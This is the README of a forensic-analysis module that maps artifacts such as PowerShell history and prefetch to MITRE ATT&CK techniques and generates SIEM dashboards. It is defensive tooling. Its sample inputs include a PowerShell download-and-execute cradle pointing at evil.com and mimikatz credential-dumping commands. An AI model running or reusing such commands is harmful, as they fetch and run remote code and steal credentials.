# MITRE ATT&CK Integration Module

**Version:** 2.0.0
**Status:** ✅ Production Ready

## Overview

The MITRE ATT&CK Integration Module provides comprehensive content-based technique detection and dashboard generation for forensic artifact analysis in Rowanholt. This module features pattern matching across all artifact content, multi-tactic technique support, and automatic ATT&CK Navigator layer generation.

## Features

- ✅ **Comprehensive Content Scanning**: Scans ALL JSON records (no sampling) for accurate detection
- ✅ **Large File Streaming**: Supports files >10MB with chunked content scanning
- ✅ **ATT&CK v20.1**: every Enterprise and Mobile technique named (`rowanholt/post/mitre/attack_lookup.py`); about 320 detected
- ✅ **Multi-Tactic Support**: Techniques mapped to all relevant tactics (e.g., T1078 maps to 4 tactics)
- ✅ **Pattern-Based Detection**: Content matching for PowerShell, mimikatz, lateral movement, etc.
- ✅ **ATT&CK Navigator Integration**: Automatic layer file generation for visualization
- ✅ **Splunk Dashboards**: Individual technique dashboards with inline tactic badges
- ✅ **Full Technique Descriptions**: Complete descriptions from enterprise_attack.csv
- ✅ **Elrond Integration**: Seamless integration with existing analysis pipeline

## Quick Start

### 1. Update ATT&CK Data

```bash
python -m analysis.mitre.cli update
```

### 2. Map Artifact to Techniques

```python
from analysis.mitre import TechniqueMapper

mapper = TechniqueMapper()
techniques = mapper.map_artifact_to_techniques(
    artifact_type='powershell_history',
    context='invoke-mimikatz -command "sekurlsa::logonpasswords"'
)

for tech in techniques:
    print(f"{tech['id']}: {tech['name']} (confidence: {tech['confidence']:.2f})")
```

Output:
```
T1003.001: LSASS Memory (confidence: 0.95)
T1003: OS Credential Dumping (confidence: 0.90)
T1059.001: PowerShell (confidence: 0.95)
T1059: Command and Scripting Interpreter (confidence: 0.90)
```

### 3. Generate Dashboards

```python
from analysis.mitre import MitreDashboardGenerator

generator = MitreDashboardGenerator()
result = generator.save_dashboards(
    technique_mappings=techniques,
    output_dir='/tmp/dashboards',
    formats=['splunk', 'elastic', 'navigator']
)

print(f"Splunk dashboard: {result['splunk']}")
print(f"Kibana dashboard: {result['elastic']}")
print(f"Navigator layer: {result['navigator']}")
```

## Module Structure

```
analysis/mitre/
├── __init__.py              # Module exports
├── attck_updater.py         # ATT&CK data updater (500 lines)
├── technique_mapper.py      # Artifact-to-technique mapper (515 lines)
├── dashboard_generator.py   # Dashboard generator (600 lines)
├── cli.py                   # Command-line interface (500 lines)
├── README.md               # This file
└── templates/              # Dashboard templates (future)
```

## Components

### 1. MitreAttackUpdater

Automatically downloads and caches MITRE ATT&CK framework data.

**Key Features:**
- Downloads STIX 2.0 data from official MITRE GitHub
- Parses techniques, tactics, groups, software, and mitigations
- Version tracking and changelog generation
- Automatic weekly updates
- Fallback URLs for reliability

**Usage:**
```python
from analysis.mitre import MitreAttackUpdater

updater = MitreAttackUpdater()

# Update cache (auto-updates if >7 days old)
updater.update_local_cache()

# Force update
updater.update_local_cache(force=True)

# Load cached data
data = updater.load_cached_data()
print(f"Version: {data['version']}")
print(f"Techniques: {len(data['techniques'])}")
```

### 2. TechniqueMapper

Maps forensic artifacts to ATT&CK techniques with confidence scoring.

**Supported Artifact Types:**

**Windows:**
- `prefetch`, `powershell_history`, `cmd_history`, `wmi_consumers`
- `scheduled_tasks`, `registry_run_keys`, `services`, `lsass_dump`
- `sam_dump`, `browser_data`, `timestomp`, `clear_logs`

**Linux:**
- `bash_history`, `cron_jobs`, `systemd_services`, `ssh_authorized_keys`

**macOS:**
- `launch_agents`, `launch_daemons`, `login_items`, `plist_files`

**Network:**
- `network_connections`, `dns_queries`, `network_traffic`

**Usage:**
```python
from analysis.mitre import TechniqueMapper

mapper = TechniqueMapper()

# Simple mapping
techniques = mapper.map_artifact_to_techniques('prefetch')

# With context (command line, file content, etc.)
techniques = mapper.map_artifact_to_techniques(
    artifact_type='powershell_history',
    context='Invoke-Mimikatz -DumpCreds'
)

# With artifact data
techniques = mapper.map_artifact_to_techniques(
    artifact_type='prefetch',
    artifact_data={'filename': 'mimikatz.exe'}
)

# Get confidence threshold
threshold = mapper.get_confidence_threshold('powershell_history')  # 0.7

# Add custom mapping
mapper.add_custom_mapping('my_artifact', 'T1059', 0.85)
```

### 3. MitreDashboardGenerator

Generates MITRE ATT&CK coverage dashboards in multiple formats.

**Supported Formats:**
- **Splunk XML**: Dashboard with coverage statistics and technique tables
- **Kibana JSON**: Elasticsearch dashboard with visualizations
- **Navigator JSON**: ATT&CK Navigator layer with heatmap

**Usage:**
```python
from analysis.mitre import MitreDashboardGenerator

generator = MitreDashboardGenerator()

# Generate all formats
result = generator.save_dashboards(
    technique_mappings=techniques,
    output_dir='/tmp/dashboards',
    formats=['splunk', 'elastic', 'navigator']
)

# Get coverage statistics
coverage = generator._calculate_coverage(techniques)
print(f"Coverage: {coverage['statistics']['coverage_percentage']:.1f}%")
print(f"Detected: {coverage['statistics']['detected_techniques']}")
```

### 4. CLI Tools

Command-line interface for all MITRE operations.

**Available Commands:**

```bash
# Update ATT&CK data
python -m analysis.mitre.cli update

# Map artifact to techniques
python -m analysis.mitre.cli map powershell_history \
    --context "invoke-mimikatz" \
    --output /tmp/results.json

# Map with artifact data
python -m analysis.mitre.cli map prefetch \
    --data '{"filename":"mimikatz.exe"}' \
    --output /tmp/results.json

# Generate dashboards
python -m analysis.mitre.cli dashboard \
    --input /tmp/results.json \
    --output /tmp/dashboards \
    --formats splunk,elastic,navigator

# Get technique information
python -m analysis.mitre.cli info T1059.001

# Show statistics
python -m analysis.mitre.cli stats --detailed

# List available artifact types
python -m analysis.mitre.cli list-artifacts
```

## Integration with Elrond

The module integrates seamlessly with the existing Elrond analysis pipeline:

```python
from analysis.rowanholt.post.mitre.mitre_integration import ElrondMitreIntegration

# Initialize integration
integration = ElrondMitreIntegration(
    output_dir='/tmp/rowanholt/mitre',
    auto_update=True
)

# Map artifacts during analysis
artifacts = [
    {
        'type': 'powershell_history',
        'context': 'Invoke-Mimikatz -DumpCreds',
        'data': {'user': 'admin'}
    },
    {
        'type': 'prefetch',
        'data': {'filename': 'mimikatz.exe'}
    }
]

techniques = integration.map_artifacts_batch(artifacts)

# Generate dashboards
result = integration.generate_dashboards(
    case_name='CASE-2025-001',
    formats=['splunk', 'elastic', 'navigator']
)

# Export for legacy Elrond format
integration.export_to_legacy_format('CASE-2025-001')

# Get techniques for SIEM
splunk_techniques = integration.get_techniques_for_splunk()
elastic_docs = integration.get_techniques_for_elastic()

# Get coverage statistics
stats = integration.get_coverage_statistics()
print(f"Coverage: {stats['coverage_percentage']:.1f}%")
```

## Configuration

Configuration is stored in `config/mitre.yml`:

```yaml
# Cache configuration
cache:
  directory: "/tmp/rowanholt/mitre_cache"
  max_age_days: 7
  auto_update: true

# Mapping configuration
mapping:
  min_confidence: 0.5
  context_aware: true
  data_aware: true

# Dashboard configuration
dashboards:
  output_dir: "/tmp/rowanholt/dashboards"
  default_formats:
    - splunk
    - elastic
    - navigator

# Elrond integration
elrond_integration:
  enabled: true
  auto_map: true
  auto_generate_dashboards: true
```

## Examples

### Example 1: Basic Technique Mapping

```python
from analysis.mitre import TechniqueMapper

mapper = TechniqueMapper()

# Map PowerShell artifact with suspicious command
techniques = mapper.map_artifact_to_techniques(
    artifact_type='powershell_history',
    context='IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
)

for tech in techniques:
    print(f"{tech['id']}: {tech['name']}")
    print(f"  Confidence: {tech['confidence']:.2f}")
    print(f"  Tactics: {', '.join(tech['tactics'])}")
```

Output:
```
T1059.001: PowerShell
  Confidence: 0.95
  Tactics: Execution

T1105: Ingress Tool Transfer
  Confidence: 0.90
  Tactics: Command and Control

T1027: Obfuscated Files or Information
  Confidence: 0.85
  Tactics: Stealth
```

### Example 2: Generate Coverage Report

```python
from analysis.mitre import TechniqueMapper, MitreDashboardGenerator

# Map multiple artifacts
mapper = TechniqueMapper()
all_techniques = []

artifacts = [
    ('powershell_history', 'Invoke-Mimikatz'),
    ('prefetch', None),
    ('scheduled_tasks', None),
]

for artifact_type, context in artifacts:
    techniques = mapper.map_artifact_to_techniques(artifact_type, context=context)
    all_techniques.extend(techniques)

# Generate dashboards
generator = MitreDashboardGenerator()
result = generator.save_dashboards(
    technique_mappings=all_techniques,
    output_dir='/tmp/case_dashboards'
)

print(f"Dashboards saved to: {result['output_dir']}")
```

### Example 3: CLI Workflow

```bash
# Update ATT&CK data
python -m analysis.mitre.cli update

# Map artifact
python -m analysis.mitre.cli map powershell_history \
    --context "Invoke-Mimikatz -DumpCreds" \
    --output /tmp/techniques.json

# Generate dashboards
python -m analysis.mitre.cli dashboard \
    --input /tmp/techniques.json \
    --output /tmp/dashboards

# View technique details
python -m analysis.mitre.cli info T1003.001

# Check coverage statistics
python -m analysis.mitre.cli stats --detailed
```

## Technical Details

### Confidence Scoring

Confidence scores (0.0-1.0) indicate mapping certainty:

- **High (≥0.8)**: Strong evidence (e.g., mimikatz.exe in prefetch)
- **Medium (0.5-0.8)**: Moderate evidence (e.g., generic PowerShell execution)
- **Low (<0.5)**: Weak evidence (e.g., network connection)

Confidence is calculated from:
1. **Base confidence**: Pre-defined for artifact type
2. **Context bonus**: Pattern matching in command lines/content
3. **Data bonus**: Specific file names, registry keys, etc.

### ATT&CK Data Structure

Cached data structure:
```json
{
  "version": "15.1",
  "last_updated": "2025-01-15T12:00:00Z",
  "techniques": {
    "T1059.001": {
      "id": "T1059.001",
      "name": "PowerShell",
      "description": "...",
      "tactics": ["Execution"],
      "platforms": ["Windows"],
      "url": "https://attack.mitre.org/techniques/T1059/001/"
    }
  },
  "tactics": {...},
  "groups": {...},
  "software": {...},
  "mitigations": {...}
}
```

## Testing

```python
# Test ATT&CK update
from analysis.mitre import MitreAttackUpdater

updater = MitreAttackUpdater()
assert updater.update_local_cache() == True

data = updater.load_cached_data()
assert len(data['techniques']) > 500
assert 'version' in data

# Test technique mapping
from analysis.mitre import TechniqueMapper

mapper = TechniqueMapper()
techniques = mapper.map_artifact_to_techniques('powershell_history')
assert len(techniques) > 0
assert all('confidence' in t for t in techniques)

# Test dashboard generation
from analysis.mitre import MitreDashboardGenerator

generator = MitreDashboardGenerator()
result = generator.save_dashboards(techniques, '/tmp/test_dashboards')
assert 'splunk' in result
assert 'elastic' in result
assert 'navigator' in result
```

## Performance

- **ATT&CK Update**: ~5-10 seconds (downloads ~10MB STIX data)
- **Technique Mapping**: <1ms per artifact
- **Dashboard Generation**: ~100ms for all formats
- **Cache Size**: ~5MB compressed

## Troubleshooting

### Issue: ATT&CK data not updating

```python
# Force update
from analysis.mitre import MitreAttackUpdater

updater = MitreAttackUpdater()
updater.update_local_cache(force=True)
```

### Issue: No techniques mapped

Check artifact type:
```python
from analysis.mitre import TechniqueMapper

mapper = TechniqueMapper()
print(mapper.ARTIFACT_MAPPINGS.keys())  # List available types
```

### Issue: Low confidence scores

Provide more context:
```python
techniques = mapper.map_artifact_to_techniques(
    artifact_type='powershell_history',
    context='full command line here',  # Improves accuracy
    artifact_data={'user': 'admin', 'timestamp': '2025-01-15'}
)
```

## Future Enhancements

- [ ] Machine learning-based technique prediction
- [ ] Automated threat hunting rules
- [ ] Integration with threat intelligence feeds
- [ ] Real-time technique detection
- [x] Mobile ATT&CK (names, layers: `rowanholt/post/mitre/attack_lookup.py`, `layers.py`)
- [ ] ICS ATT&CK support
- [ ] Custom technique definitions

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [ATT&CK STIX Data](https://github.com/mitre/cti)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Rowanholt DF Acceleration Suite](https://github.com/cmdaltr/rowanholt)

## License

Part of Rowanholt DF Acceleration Suite - See LICENSE file

## Support

For issues or questions:
- Check this README
- Review module docstrings
- Open issue on GitHub
- Contact Rowanholt development team

---

**Version:** 2.0.0
**Last Updated:** 2025-12-07
**Status:** ✅ Production Ready
